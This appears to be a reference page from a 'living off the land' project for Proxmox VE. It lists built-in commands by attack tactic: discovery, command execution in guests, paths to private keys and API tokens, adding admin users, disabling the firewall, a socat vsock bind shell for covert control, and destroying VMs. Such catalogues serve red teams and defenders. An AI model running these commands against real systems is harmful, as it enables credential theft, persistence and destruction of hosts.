---
layout: page
title: Functions
---

# LOLPROX Functions

A categorized list of interesting capabilities documented in the LOLPROX project.

## Discovery Functions

| Function | Binary | Description |
|----------|--------|-------------|
| List all VMs | qm | `qm list` - Enumerate all QEMU VMs |
| List all containers | pct | `pct list` - Enumerate all LXC containers |
| List cluster nodes | pvecm | `pvecm nodes` - Show all cluster members |
| Get version info | pveversion | `pveversion -v` - Detailed version information |
| List storage | pvesm | `pvesm status` - All storage backends |
| List users | pveum | `pveum user list` - All configured users |
| List ACLs | pveum | `pveum acl list` - Permission assignments |
| VM configuration | qm | `qm config {vmid}` - Full VM config |
| Container configuration | pct | `pct config {ctid}` - Full container config |
| Firewall status | pve-firewall | `pve-firewall status` - Firewall state |

## Execution Functions

| Function | Binary | Description |
|----------|--------|-------------|
| Execute in VM | qm | `qm guest exec {vmid} -- command` |
| Execute in container | pct | `pct exec {ctid} -- command` |
| QEMU monitor | qm | `qm monitor {vmid}` - Direct QEMU access |
| vsock shell | socat | `socat VSOCK-LISTEN:{port},fork EXEC:/bin/bash` |

## File Operations

| Function | Binary | Description |
|----------|--------|-------------|
| Read file from VM | qm | `qm guest cmd {vmid} file-read /path` |
| Write file to VM | qm | `qm guest cmd {vmid} file-write /path {b64}` |
| Push file to container | pct | `pct push {ctid} local remote` |
| Pull file from container | pct | `pct pull {ctid} remote local` |

## Credential Access Functions

| Function | Path/Binary | Description |
|----------|-------------|-------------|
| Root CA key | /etc/pve/priv/pve-root-ca.key | CA private key for cert forgery |
| Auth key | /etc/pve/priv/authkey.key | Ticket signing key |
| API tokens | /etc/pve/priv/token.cfg | All API tokens |
| User config | /etc/pve/user.cfg | User definitions |
| Cloud-init secrets | qm | `qm cloudinit dump {vmid} user` |
| Node SSL key | /etc/pve/local/pve-ssl.key | Node TLS private key |

## Persistence Functions

| Function | Binary | Description |
|----------|--------|-------------|
| Create user | pveum | `pveum user add {user}@{realm}` |
| Create API token | pveum | `pveum user token add {user} {token}` |
| Modify ACL | pveum | `pveum acl modify / --roles Administrator` |
| Create snapshot | qm/pct | Preserve state for recovery |
| Add storage | pvesm | `pvesm add` - Mount external storage |

## Collection Functions

| Function | Binary | Description |
|----------|--------|-------------|
| Full VM backup | vzdump | `vzdump {vmid}` - Complete VM image |
| All VM backup | vzdump | `vzdump --all` - Every VM on node |
| Snapshot VM | qm | `qm snapshot {vmid} {name}` |
| List snapshots | qm | `qm listsnapshot {vmid}` |
| Storage content | pvesm | `pvesm list {storage}` |

## Lateral Movement Functions

| Function | Binary | Description |
|----------|--------|-------------|
| Guest agent exec | qm | Command execution in VMs |
| Container exec | pct | Command execution in containers |
| vsock tunnel | socat | Host-guest covert channel |
| QMP socket | socat | `UNIX-CONNECT:/run/qemu-server/{vmid}.qmp` |

## Impact Functions

| Function | Binary | Description |
|----------|--------|-------------|
| Stop VM | qm | `qm stop {vmid}` |
| Destroy VM | qm | `qm destroy {vmid}` |
| Stop container | pct | `pct stop {ctid}` |
| Destroy container | pct | `pct destroy {ctid}` |
| Disable firewall | pve-firewall | Disable security controls |

## Defense Evasion Functions

| Function | Binary | Description |
|----------|--------|-------------|
| Disable firewall | pvesh | `pvesh set /nodes/{n}/firewall/options --enable 0` |
| Add firewall rule | pvesh | Create permissive rules |
| vsock C2 | socat | Bypass network monitoring |
| Guest agent | qm | Network-less execution |

## Network Functions

| Function | Binary | Description |
|----------|--------|-------------|
| Scan NFS | pvesm | `pvesm scan nfs {server}` |
| Scan iSCSI | pvesm | `pvesm scan iscsi {portal}` |
| Port forward | socat | `TCP-LISTEN:{p},fork TCP:{t}:{tp}` |
| Firewall rules | pve-firewall | `pve-firewall compile` |
